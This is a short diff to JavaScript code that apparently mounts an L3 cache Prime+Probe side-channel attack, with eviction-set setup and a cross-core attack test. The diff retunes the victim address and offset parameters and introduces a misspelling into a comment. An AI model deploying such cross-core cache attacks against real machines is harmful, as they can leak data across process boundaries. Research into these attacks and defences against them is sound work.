@@ -453,7 +453,7 @@ async function l3pp_main(options){
     let evset = new EvictionListL3(buffer, sets[0]); 
 
     let TRIALS = 250, WARMUP_ROUNDS = 100, THRESHOLD = 60;
-    let VICTIM = 8192;
+    let VICTIM = 27392;
 
     ipdft_out = intra_process_detection_fp_test(evset, buffer, WARMUP_ROUNDS, TRIALS, VICTIM);
     log("detection-rate: " + ipdft_out[0]);
@@ -463,7 +463,7 @@ async function l3pp_main(options){
     let TRANSMIT_ROUNDS_SIDE = 256
     intra_process_transmission_test(evset, buffer, WARMUP_ROUNDS, TRANSMIT_ROUNDS_SIDE, VICTIM);
 
-    // remote_set_profiling(evset);
+    // remote_set_profling(evset);
     log("cross-core attack ready to begin");
     await sleep(3000);
     cross_core_test(evset, 128); 
@@ -568,4 +568,4 @@ function remote_set_profiling(evset){
     }
 }
 
-l3pp_main({offset:63})
+l3pp_main({offset:44})
